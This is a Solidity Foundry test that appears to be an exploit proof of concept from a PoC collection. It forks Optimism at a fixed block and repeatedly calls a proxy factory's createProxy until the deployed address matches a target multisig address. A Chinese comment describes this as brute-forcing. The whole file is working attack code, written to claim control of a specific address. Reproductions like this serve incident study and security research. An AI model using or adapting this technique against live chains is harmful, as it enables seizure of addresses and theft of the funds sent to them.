pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

//https://www.levi104.com/categories/08-PoC/

contract Attacker is Test {

    IProxyFactory proxy = IProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);

    function setUp() public {
        vm.createSelectFork("optimism", 10_607_735);
    }

    function testExploit() public {
        // 爆破，得到多签地址`0x4f3a`
        address multiSigAddress;
        while (multiSigAddress != 0x4f3a120E72C76c22ae802D129F599BFDbc31cb81) {
            multiSigAddress = proxy.createProxy(0xE7145dd6287AE53326347f3A6694fCf2954bcD8A, "0x");
            console.log("multiSigAddress",multiSigAddress);
        }

        assertEq(multiSigAddress, 0x4f3a120E72C76c22ae802D129F599BFDbc31cb81);
    }

}